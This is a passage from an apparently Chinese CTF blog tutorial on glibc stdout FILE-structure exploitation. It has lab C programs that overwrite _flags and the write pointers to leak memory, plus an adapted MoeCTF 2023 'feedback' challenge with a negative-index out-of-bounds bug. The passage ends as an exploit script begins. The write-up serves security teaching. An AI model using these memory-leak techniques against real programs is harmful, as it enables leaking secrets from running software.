class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,_IOFBF,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">// gcc -g -o lab3 lab3.c</span></span><br></pre></td></tr></table></figure><ul><li>在调用<code>setvbuf</code>之前<code>stdout</code>结构体如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//其中 _flags = 0xFBAD2084</span></span><br><span class="line"><span class="comment">//剩下的__IO_read_ptr等都是为0</span></span><br></pre></td></tr></table></figure><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250723135400982.png" alt="image-20250723135400982"></p><ul><li>在调用<code>setvbuf</code>将<code>stdout</code>设置为全缓冲后，<code>stdout</code>的结构体如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//其中 _flags = 0xFBAD2084</span></span><br><span class="line"><span class="comment">// _IO_read_ptr到_IO_write_end都为0</span></span><br><span class="line"><span class="comment">// 而_IO_buf_base和_IO_buf_end为 0x94c010</span></span><br><span class="line"><span class="comment">// 而0x94c010是调用setvbuf时,该函数调用malloc申请堆块的起始地址</span></span><br></pre></td></tr></table></figure><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250723135534116.png" alt="image-20250723135534116"></p><ul><li>当我们调用<code>printf</code>函数进行输出时会发现没有内容输出，再看<code>stdout</code>这个结构体，会发现<code>_IO_read_ptr到_IO_write_base</code>的值已经改变</li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250723135909635.png" alt="image-20250723135909635"></p><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250723135930332.png" alt="image-20250723135930332"></p><h2 id="lab4_任意地址读">lab4_任意地址读</h2><ul><li>在做该实验之前，再了解一下缓冲区的宏定义，首先需要明确一点，要将一些东西附带输出出来，修改<code>_flag</code>位时就必须使用如下几个宏定义：<ul><li><code>#define _IO_MAGIC 0xFBAD0000  </code></li><li><code>#define _IO_CURRENTLY_PUTTING 0x800</code></li><li><code>#define _IO_IS_APPENDING 0x1000 /* Is appending 处于附加模式（在文件末尾追加内容） */</code></li><li>当然其实也可以像<code>lab2</code>和<code>lab3</code>那样修改缓冲模式，但是修改<code>_flag</code>的值更一般是<code>0xFBAD1800</code>（通过比较多的实验后，得出使用<code>0xFBAD1800</code>这个值作为<code>_flag</code>的值会更好会更方便，有的时候只需要改<code>2</code>处或者<code>3</code>处即可。）</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC 0xFBAD0000           <span class="comment">/* Magic number 文件结构体的魔数，用于标识文件结构体的有效性 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _OLD_STDIO_MAGIC 0xFABC0000    <span class="comment">/* Emulate old stdio 模拟旧的标准输入输出库（stdio）行为的魔数 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC_MASK 0xFFFF0000      <span class="comment">/* Magic mask 魔数掩码，用于从 _flags 变量中提取魔数部分 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_BUF 1                 <span class="comment">/* User owns buffer; don&#x27;t delete it on close. 用户拥有缓冲区，不在关闭时删除缓冲区 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_UNBUFFERED 2               <span class="comment">/* Unbuffered 无缓冲模式，直接进行I/O操作，不使用缓冲区 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_READS 4                 <span class="comment">/* Reading not allowed 不允许读取操作 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES 8                <span class="comment">/* Writing not allowed 不允许写入操作 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_EOF_SEEN 0x10              <span class="comment">/* EOF seen 已经到达文件结尾（EOF） */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_ERR_SEEN 0x20              <span class="comment">/* Error seen 已经发生错误 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_DELETE_DONT_CLOSE 0x40     <span class="comment">/* Don&#x27;t call close(_fileno) on cleanup. 不关闭文件描述符 _fileno，在清理时不调用 close 函数 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINKED 0x80                <span class="comment">/* Set if linked (using _chain) to streambuf::_list_all. 链接到一个链表（使用 _chain 指针），用于 streambuf::_list_all */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IN_BACKUP 0x100            <span class="comment">/* In backup 处于备份模式 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINE_BUF 0x200             <span class="comment">/* Line buffered 行缓冲模式，在输出新行时刷新缓冲区 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_TIED_PUT_GET 0x400         <span class="comment">/* Set if put and get pointer logically tied. 在输出和输入指针逻辑上绑定时设置 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x800    <span class="comment">/* Currently putting 当前正在执行 put 操作 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_APPENDING 0x1000        <span class="comment">/* Is appending 处于附加模式（在文件末尾追加内容） */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_FILEBUF 0x2000          <span class="comment">/* Is file buffer 是一个文件缓冲区 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_BAD_SEEN 0x4000            <span class="comment">/* Bad seen 遇到错误（bad flag set） */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_LOCK 0x8000           <span class="comment">/* User lock 用户锁定，防止其他线程访问 */</span></span></span><br></pre></td></tr></table></figure><ul><li>理解了<code>无缓冲</code>、<code>行缓冲</code>、<code>全缓冲</code>模式下<code>stdout</code>结构体成员值的一些变化后，我们是否能修改<code>stdout</code>结构体成员里面的值，使得在调用上层的输出函数时，能将一些<code>libc</code>地址等给顺带打印出来呢？接下来就看看下面的实验示例。</li><li><code>lab4</code>主要介绍的是无缓冲模式下如何修改<code>stdout</code>结构体的值（一般题目都是无缓冲模式，其他模式比较少见）首先是在不修改<code>_flag</code>值下修改其他相关成员，修改后其实就会再程序结束调用<code>exit()</code>后将内容都打印出来</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> * got_adr = <span class="number">0x601018</span>; <span class="comment">// printf_got表的地址</span></span><br><span class="line">        setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,_IONBF,<span class="number">0</span>);  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">1</span>); <span class="comment">// 先调用一次printf使得printf_got存放其真实地址,如果是开了Full RELRO就不用了</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n%p&quot;</span>,*got_adr);</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> addr = *got_adr + <span class="number">0x374140</span>;</span><br><span class="line">        <span class="type">int</span> fd = open(<span class="string">&quot;./flag1&quot;</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        read(fd,addr,<span class="number">0x12</span>);</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *ptr = <span class="built_in">stdout</span>;</span><br><span class="line">        ptr[<span class="number">1</span>] = addr;<span class="comment">// _IO_read_ptr</span></span><br><span class="line">        ptr[<span class="number">2</span>] = addr;<span class="comment">// _IO_read_end</span></span><br><span class="line">        ptr[<span class="number">3</span>] = addr;<span class="comment">// _IO_read_base</span></span><br><span class="line">        ptr[<span class="number">4</span>] = addr;<span class="comment">// _IO_write_base</span></span><br><span class="line">        ptr[<span class="number">5</span>] = addr+<span class="number">0x12</span>;<span class="comment">// _IO_write_ptr</span></span><br><span class="line">        ptr[<span class="number">6</span>] = addr+<span class="number">0x20</span>;<span class="comment">// _IO_write_end</span></span><br><span class="line">        ptr[<span class="number">7</span>] = addr;<span class="comment">// _IO_buf_base</span></span><br><span class="line">        ptr[<span class="number">8</span>] = addr+<span class="number">0x20</span>;<span class="comment">// _IO_buf_end</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Hello world&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来调试一下，在执行<code>printf(&quot;Hello world&quot;);</code>的时候<code>stdout</code>已经被修改成了这样</p><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250723170028529.png" alt="image-20250723170028529"></p><ul><li>调用完<code>printf(&quot;Hello world&quot;);</code>后发现要打印的字符串内容并没有输出</li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250723170118863.png" alt="image-20250723170118863"></p><ul><li>当调用<code>exit</code>退出的时候才会输出</li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250723170203196.png" alt="image-20250723170203196"></p><ul><li>接下来如果我们修改<code>_flag</code>为<code>0xFBDA1800</code>呢，接下来查看如下代码：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> * got_adr = <span class="number">0x601020</span>; <span class="comment">// printf_got表的地址</span></span><br><span class="line">        setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,_IONBF,<span class="number">0</span>);                                       </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">1</span>);                                                          <span class="comment">// 先调用一次printf使得printf_got存放其真实地址,如果是开了Full RELRO就不用了</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n%p&quot;</span>,*got_adr);</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> addr = *got_adr + <span class="number">0x374140</span>;</span><br><span class="line">        <span class="type">int</span> fd = open(<span class="string">&quot;./flag1&quot;</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        read(fd,addr,<span class="number">0x12</span>);</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *ptr = <span class="built_in">stdout</span>;</span><br><span class="line">        ptr[<span class="number">0</span>] = <span class="number">0xFBAD1800</span>;</span><br><span class="line"><span class="comment">//        ptr[1] = 0;// _IO_read_ptr</span></span><br><span class="line"><span class="comment">//        ptr[2] = 0;// _IO_read_end</span></span><br><span class="line"><span class="comment">//        ptr[3] = 0;// _IO_read_base</span></span><br><span class="line">        ptr[<span class="number">4</span>] = addr;<span class="comment">// _IO_write_base</span></span><br><span class="line">        ptr[<span class="number">5</span>] = addr+<span class="number">0x12</span>;<span class="comment">// _IO_write_ptr</span></span><br><span class="line">        ptr[<span class="number">6</span>] = addr;<span class="comment">// _IO_write_end</span></span><br><span class="line"><span class="comment">//        ptr[7] = 0;// _IO_buf_base</span></span><br><span class="line"><span class="comment">//        ptr[8] = 0;// _IO_buf_end</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Hello world&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>编译运行一下发现是可以输出出来内容的：</li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250723170351783.png" alt="image-20250723170351783"></p><ul><li>接下来调试看看，在调用<code>puts(&quot;hello world&quot;)</code>之前已经将<code>stdout</code>变成了这样，其实只要修改<code>_IO_write_ptr、base、end</code>即可</li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250723170519685.png" alt="image-20250723170519685"></p><ul><li>调用执行<code>puts(&quot;Hello world&quot;);</code>这句后马上就能将flag输出出来，如果<code>puts</code>换成<code>printf</code>其实也是可以的。</li><li>还有<code>_IO_read</code>相关指针其实设置为<code>0</code>也是可以的，<code>_IO_buf</code>相关指针设置为<code>0</code>也是能输出的</li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250723170608003.png" alt="image-20250723170608003"></p><h1 id="题目1_moectf_2023-feedback改">题目1_MoeCTF_2023 feedback(改)</h1><ul><li>这题给了源码，但是<code>libc</code>版本是<code>2.31</code>的，所以我稍微修改了一下源码，在<code>glibc2.23</code>的环境下进行编译。<strong>改编后的题目会比原题简单</strong>，主要是为了理解<code>stdout</code>如何实现任意地址写。</li><li>改编后的代码如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span>* feedback_list[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化缓冲区</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">        setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">        setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//读取flag到libc</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">read_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> fd = open(<span class="string">&quot;./flag&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="type">char</span> *p;</span><br><span class="line">        <span class="keyword">if</span>(fd == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;open flag error!&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">malloc</span>(<span class="number">0x1000</span>);<span class="comment">// 改动部分</span></span><br><span class="line">        <span class="type">char</span>* flag = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);<span class="comment">// 改动部分</span></span><br><span class="line">        <span class="keyword">if</span>(!flag)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;malloc error!&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        read(fd, flag, <span class="number">0x50</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;a gift: %p\n&quot;</span>,flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//读取数字</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">read_num</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">char</span> str[<span class="number">0x10</span>];</span><br><span class="line">        read(<span class="number">0</span>, str, <span class="number">0xf</span>);</span><br><span class="line">        <span class="keyword">return</span> atoi(str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//读取字符串</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">read_str</span><span class="params">(<span class="type">char</span>* str)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="type">char</span> ch;</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">0x48</span>];</span><br><span class="line">        read(<span class="number">0</span>, str, <span class="number">0x48</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印出你的反馈信息</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_feedback</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Your feedback is: &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d. %s\n&quot;</span>, i, feedback_list[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> i, index;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//打印提示信息</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Can you give me your feedback?&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;There are some questions.&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;1. What do you think of the quality of the challenge this time?&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;2. Give me some suggestions.&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;3. Please give me your ID.&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//初始化反馈列表</span></span><br><span class="line">        feedback_list[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">                feedback_list[i] = <span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//输入反馈内容</span></span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Which list do you want to write?&quot;</span>);</span><br><span class="line">                index = read_num();</span><br><span class="line">                <span class="keyword">if</span>(index &gt; <span class="number">3</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="built_in">puts</span>(<span class="string">&quot;No such list.&quot;</span>);</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Then you can input your feedback.&quot;</span>);</span><br><span class="line">                read_str(feedback_list[index]);</span><br><span class="line">                print_feedback();</span><br><span class="line">        &#125;</span><br><span class="line">        _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        init();</span><br><span class="line">        read_flag();</span><br><span class="line">        vuln();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题目1_分析1">题目1_分析1</h2><ul><li>先查看一下保护机制</li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250721185641480.png" alt="image-20250721185641480"></p><ul><li>直接使用<code>IDA pro</code>逆向这个程序。<code>main</code>函数调用了这三个函数</li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250723171604846.png" alt="image-20250723171604846"></p><ul><li><code>init</code>其实就是初始化输入输出</li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250723171645682.png" alt="image-20250723171645682"></p><ul><li><code>read_flag</code>这个函数<ul><li>打开了<code>flag</code>文件，并且申请了两个堆块</li><li>将<code>flag</code>文件的内容输入到其中一个堆块中</li><li>将堆块的地址告诉我们</li></ul></li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250723173015944.png" alt="image-20250723173015944"></p><ul><li><code>vuln()</code>函数如下：<ul><li>puts输出没什么作用的菜单</li><li>然后申请三个堆块并将三个堆块的地址放入到<code>feedback_list</code>中</li><li>之后让用户选择一个堆块索引，并且向堆块索引中向指定堆地址写入用户想要的内容，注意<strong>用户输入的时候可以输入一个负值，导致数组越界</strong></li></ul></li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250723171940192.png" alt="image-20250723171940192"></p><ul><li>在每次<code>read_str</code>后程序还会将3个堆块中的数据全部打印出来</li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250723172239485.png" alt="image-20250723172239485"></p><ul><li>接下来再看看<code>.bss</code>段这边，其实我们会发现<code>feedback_list</code>上面一点其实就存放着<code>stdout</code>的地址，此时我们可以使用数组越界来对<code>stdout</code>这个<code>FILE</code>结构体进行修改，使得<code>print_feedback()</code>会将flag顺带打印出来</li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250723172304876.png" alt="image-20250723172304876"></p><h2 id="题目1_分析2">题目1_分析2</h2><ul><li>首先我们先将<code>gift</code>接收一下和<code>feedback_list到stdout</code>的偏移计算一下</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 